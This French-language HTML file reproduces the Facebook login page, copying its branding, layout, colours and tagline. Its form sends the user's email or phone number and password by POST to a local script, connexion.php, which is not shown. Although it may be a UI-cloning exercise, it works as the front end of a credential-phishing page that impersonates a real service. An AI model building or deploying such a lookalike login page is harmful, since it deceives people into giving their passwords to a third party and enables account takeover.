<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page de connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            justify-content: space-between;
            max-width: 1000px;
            width: 100%;
            padding: 20px;
        }

        .left-section {
            width: 50%;
            padding-right: 40px;
        }

        .left-section h1 {
            font-size: 48px;
            color: #1877f2;
        }

        .left-section p {
            font-size: 24px;
            color: #333;
        }

        .right-section {
            width: 50%;
            max-width: 400px;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }

        .right-section input[type="text"],
        .right-section input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
        }

        .right-section .login-button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 10px;
        }

        .right-section .login-button:hover {
            background-color: #155aab;
        }

        .right-section .forgot-password {
            display: block;
            text-align: center;
            margin-top: 10px;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }

        .right-section .create-account {
            display: block;
            width: 94%;
            padding: 12px;
            background-color: #42b72a;
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 15px;
            text-align: center;
            text-decoration: none;
        }

        .footer-text {
            text-align: center;
            font-size: 12px;
            color: #777;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    
    <div class="container">
        <div class="left-section">
            <h1>Facebook</h1>
            <p>Avec Facebook, partagez et restez en contact avec votre entourage.</p>
        </div>

        <div class="right-section">
            <form id="loginForm" action="connexion.php" method="POST">
                <input type="text" id="email" placeholder="Adresse e-mail ou numéro de téléphone" name="login" required>
                <input type="password" name="password" id="password" placeholder="Mot de passe" required>
                <button type="submit" name="boutton-valider" class="login-button">Connexion</button>
                <a href="#" class="forgot-password">Mot de passe oublié ?</a>
            </form>
            <a href="#" class="create-account">Créer un compte</a>
            <p class="footer-text">Créer une Page pour une célébrité, une marque ou une entreprise.</p>
        </div>
    </div>
    
</body>
</html>
